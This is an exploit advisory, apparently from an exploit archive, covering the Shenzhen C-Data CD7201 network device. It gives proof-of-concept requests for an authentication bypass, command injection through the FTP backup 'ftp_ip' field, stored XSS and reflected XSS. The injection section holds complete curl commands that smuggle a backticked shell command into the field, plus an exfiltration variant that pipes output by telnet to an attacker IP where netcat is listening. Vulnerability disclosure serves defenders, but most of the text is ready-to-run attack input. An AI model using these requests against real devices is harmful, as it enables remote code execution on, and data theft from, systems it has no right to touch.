@@ -1,0 +1,56 @@
+id: 28109
+date: 07/11/2017
+title: Shenzhen C-Data CD7201 Command Injection / Cross Site Scripting Vulnerability
+author: Codex Lynx
+cves: 
+
+# Title: Shenzhen C-Data CD7201 / Multiple Vulnerabilities
+# Date: 10/09/2016
+# Discovered by: @codexlynx
+# Vendor: Shenzhen C-Data
+# Vendor homepage: cdatatec.com
+# Model: CD7201
+# Software Version: 2.4.6b
+# Firmware Version: 7.1.0 
+# Category: hardware, web, rce, xss
+
+[1]Authentication Bypass
+--------------------------------
+Only the main HTML iframe is protected, you can access the others via the direct URL.
+
+  - POC: Display links of the menu to bypass all the pages.
+
+http://[target]/cgi-bin/frame.php?page=frame_menu
+
+[2]Command Injection
+--------------------------------
+"FTP Backup Recovery" is insecure, you can inject system commands. 
+You can use "telnet" to the command output exfiltration.
+
+  - POC 1: Basic injection:
+
+curl --data "ftp_port=21&ftp_user=admin&ftp_passwd=admin&file_name=test&ipaddr=127.0.0.1&call_function=backup&ftp_ip=\`[Inject here]\`" http://[target]/cgi-bin/system.php?page=system_management_save
+
+  - POC 2: Injection and exfiltration:
+
+Shell 1: nc -vlp 9999    
+Shell 2: curl --data "ftp_port=21&ftp_user=admin&ftp_passwd=admin&file_name=test&ipaddr=127.0.0.1&call_function=backup&ftp_ip=\`[Inject here]|telnet [Attacker IP] 9999\`" http://[target]/cgi-bin/system.php?page=system_management_save
+       
+
+[3]Stored Cross-Site-Scripting
+--------------------------------
+Many metadata fields don't sanitize inputs.
+
+  - POC: Persistent XSS in the "Location" field (http://[target]/cgi-bin/system.php?page=hardware_information).
+
+Location" style="width:90%"><script>[Javascript Here]</script><span class="
+
+[4]Cross-Site-Scripting
+--------------------------------
+Many GET parameters don't sanitize inputs.
+
+  - POC: XSS in the "slave_mac" parameter.
+
+http://[target]/cgi-bin/slaves.php?page=slave_detail_top&slave_mac="/><script>[Javascript Here]</script>
+
+#  0day.today [2023-03-24]  #
